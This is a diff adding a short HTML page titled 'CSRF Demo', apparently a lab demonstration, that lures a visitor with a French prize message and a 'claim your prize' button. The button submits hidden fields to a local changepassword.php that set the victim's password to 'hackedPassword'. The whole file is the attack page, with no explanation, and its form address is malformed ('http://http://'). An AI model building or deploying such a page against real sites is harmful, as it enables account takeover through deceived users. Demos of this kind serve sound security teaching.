@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Demo</title>
+</head>
+<body>
+    <h1>Vous avez gagné un prix !</h1>
+    <form action="http://http://127.0.0.1/changepassword.php" method="POST">
+        <input type="hidden" name="newpassword" value="hackedPassword"/>
+        <input type="hidden" name="confirmpassword" value="hackedPassword"/>
+        <input type="submit" value="Réclamez votre prix !"/>
+    </form>
+</body>
+</html>
